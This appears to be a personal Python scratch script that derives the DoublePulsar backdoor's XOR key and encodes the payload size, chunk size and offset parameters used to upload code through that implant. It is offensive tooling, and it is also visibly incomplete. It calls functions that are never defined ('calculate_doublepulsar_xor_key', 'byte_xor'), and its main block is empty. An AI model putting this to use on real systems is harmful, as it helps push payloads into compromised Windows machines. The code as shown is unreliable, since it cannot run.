import binascii
import struct

'''
sample script to convert the XOR key to bytes to XOR encrypt the doublepulsar parameters
'''

'''
Code from:
https://stackoverflow.com/questions/55840052/xor-bytes-in-python3
'''

########Attempt1
def xor_strings(a, b):
    result = int(a, 16) ^ int(b, 16) # convert to integers and xor them together
    return '{:x}'.format(result)     # convert back to hexadecimal
  
def xor_with_str():
  key = 89765401
  print(hex(key))

  new_value = hex(key)
  byte_value = bytes(new_value.encode('utf-8'))
  print(byte_value)

  bytearray_value = bytearray(byte_value)
  print(bytearray_value)
  
  xored_entiresize = xor_strings("4096", new_value)
  xored_chunksize = xor_strings("4096", new_value)
  xored_offset = xor_strings("0", new_value)
  print("xored entiresize = ", xored_entiresize.encode())
  print("xored chunksize = ", xored_chunksize.encode())
  print("xored offset = ", xored_offset.encode())

    
#https://stackoverflow.com/questions/21017698/converting-int-to-bytes-in-python-3
def attempt_two():
    key = 89765401
    print(hex(key))
    
    new_val = hex(key)
    byte_val = bytes(new_val.encode('utf-8'))
    print(byte_val)
    
    
    entireSize= (4096).to_bytes(4, byteorder='little')
    print(entireSize)
    
    chunk = (4096).to_bytes(4, byteorder='little')
    print(chunk)
    
    offset = (0).to_bytes(4, byteorder='little')
    print(offset)
    
    parameters = bytearray()
    parameters += entireSize
    parameters += chunk
    parameters += offset
    
    byte_xor(parameters, byte_val)
    
  

def hexdump(src, length=16, sep='.'):
    """Hex dump bytes to ASCII string, padded neatly
    In [107]: x = b'\x01\x02\x03\x04AAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBB'
    In [108]: print('\n'.join(hexdump(x)))
    00000000  01 02 03 04 41 41 41 41  41 41 41 41 41 41 41 41 |....AAAAAAAAAAAA|
    00000010  41 41 41 41 41 41 41 41  41 41 41 41 41 41 42 42 |AAAAAAAAAAAAAABB|
    00000020  42 42 42 42 42 42 42 42  42 42 42 42 42 42 42 42 |BBBBBBBBBBBBBBBB|
    00000030  42 42 42 42 42 42 42 42                          |BBBBBBBB        |
    """
    FILTER = ''.join([(len(repr(chr(x))) == 3) and chr(x) or sep for x in range(256)])
    lines = []
    for c in range(0, len(src), length):
        chars = src[c: c + length]
        hex_ = ' '.join(['{:02x}'.format(x) for x in chars])
        if len(hex_) > 24:
            hex_ = '{} {}'.format(hex_[:24], hex_[24:])
        printable = ''.join(['{}'.format((x <= 127 and FILTER[x]) or sep) for x in chars])
        lines.append('{0:08x}  {1:{2}s} |{3:{4}s}|'.format(c, hex_, length * 3, printable, length))
    return lines

def bitwise_xor_bytes(a, b):
    result_int = int.from_bytes(a, byteorder="big") ^ int.from_bytes(b, byteorder="big")
    return result_int.to_bytes(max(len(a), len(b)), byteorder="big")

#https://techoverflow.net/2020/09/27/how-to-fix-python3-typeerror-unsupported-operand-types-for-bytes-and-bytes/
#Python can’t perform bitwise operations directly on byte arrays.
def new_parameter_generation():
    signature = b'\x79\xe7\xdf\x90\x00\x00\x00\x00'
    signature_long = struct.unpack('<Q', signature)[0]
    key = calculate_doublepulsar_xor_key(signature_long)
    print(hex(key))
    #doublepulsar calculator ends

    #My code begins here
    doublepulsar_xor_key = struct.pack("<I", key)
    bytes_doublepulsar_xor_key = bytes(doublepulsar_xor_key)

    entirepayloadsize = 4096
    int_entirepayloadsize = entirepayloadsize.to_bytes(4, 'little')

    chunksize = 4096
    int_chunksize = chunksize.to_bytes(4, 'little')

    offset = 0
    int_offset = offset.to_bytes(4, 'little')

    parameters_payloadsize = bitwise_xor_bytes(bytes_doublepulsar_xor_key, int_entirepayloadsize)
    parameters_chunksize = bitwise_xor_bytes(bytes_doublepulsar_xor_key, int_chunksize)
    parameters_offset = bitwise_xor_bytes(bytes_doublepulsar_xor_key, int_offset)

    parameters = bytearray()
    parameters += parameters_payloadsize
    parameters += parameters_chunksize
    parameters += parameters_offset

    print(hexdump(parameters))


if __name__ == "__main__":

